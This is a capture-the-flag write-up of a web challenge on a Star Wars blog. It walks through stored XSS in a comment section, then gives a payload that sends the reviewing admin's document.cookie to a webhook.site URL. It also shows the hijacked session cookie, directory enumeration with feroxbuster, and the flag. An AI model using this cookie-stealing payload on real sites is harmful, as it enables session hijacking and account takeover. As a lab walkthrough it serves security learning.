>Author: @congon4tor#2334  
>
>If you love Star Wars as much as I do you need to check out this blog!
---------------------
Firstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username `asdf`. Upon entering we are led to a blog post:

![Pasted image 20230615231203.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230615231203.png)

We see a comment section and not much else, so of course we have to check for XSS
```
<script>alert('XSS');</script>
```

![Pasted image 20230615231619.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230615231619.png)

Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use webhook.site to receive the cookie request.
```
<script>
document.write(``'<img src="https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c='``+document.cookie+``'" />'``);
</script>
```

This XSS generates an image pointing to my webhook.site link, and adds the user's `document.cookie` to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim's session.

![Pasted image 20230615230950.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230615230950.png)
Indeed we see a cookie: `x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0`

By substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting `/admin`. This is pretty guessable, although I do concede to running `feroxbuster` to point it out to me:
```bash
feroxbuster -u http://challenge.nahamcon.com:30413/
<...SNIP...>
02      GET        4l       28w      303c http://challenge.nahamcon.com:30413/admin
<...SNIP...>
```

When visiting /admin while having the token, we can find the flag.

![Pasted image 20230615230911.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230615230911.png)

`flag{a538c88890d45a382e44dfd00296a99b}`

- Author : Tien
